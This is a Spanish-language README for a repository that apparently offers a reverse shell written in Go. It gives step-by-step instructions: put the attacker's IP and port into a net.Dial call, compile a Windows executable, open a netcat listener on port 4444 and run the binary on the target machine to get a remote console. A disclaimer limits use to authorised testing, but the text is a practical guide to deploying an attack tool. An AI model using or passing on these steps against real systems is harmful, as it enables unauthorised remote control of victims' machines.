# Reverse Shell en Go

Este repositorio contiene un script de **Reverse Shell** escrito en Go. La Reverse Shell permite a un atacante obtener acceso remoto a la máquina de la víctima a través de una conexión TCP.

---

## 🚨 **Advertencia de Responsabilidad** 🚨

Este script debe usarse únicamente con fines educativos y de investigación en entornos controlados y con autorización previa. **El uso indebido de esta herramienta puede ser ilegal y conllevar consecuencias legales graves.** No nos hacemos responsables por el mal uso de este código.

---

## 📋 **Requisitos Previos**
- **Go instalado**: Asegúrate de tener [Go](https://go.dev/doc/install) instalado en tu sistema.
- **Netcat (nc)**: Necesitarás `netcat` para escuchar las conexiones entrantes.

---

## 📂 **Archivos del Repositorio**
- **`reverse_shell.go`**: El archivo principal que contiene el código de la reverse shell en Go.

---

## ⚙️ **Uso del Código**

1. **Modifica la IP y el puerto** en la siguiente línea del código:
   ```go
   c, _ := net.Dial("tcp", "IP:PORT") 
- Reemplaza IP con la dirección IP del atacante (la dirección donde se recibirá la conexión).
- Reemplaza PORT con el puerto que desees (por ejemplo, 4444).

2. **Compila el archivo Go** para generar el binario ejecutable:
```go
   go build -o reverse_shell.exe reverse_shell.go

```
3. **Ejecuta el siguiente comando en la terminal de la máquina atacante** para escuchar la conexión entrante:
```
  nc -lvp 4444
```
4. **Ejecuta el binario en la máquina objetivo.** Cuando se ejecute, la máquina objetivo intentará conectarse a la IP y el puerto especificados en el código.

5. **Acceso Remoto:** Si todo funciona correctamente, obtendrás una consola de acceso a la máquina remota en tu terminal de Netcat.
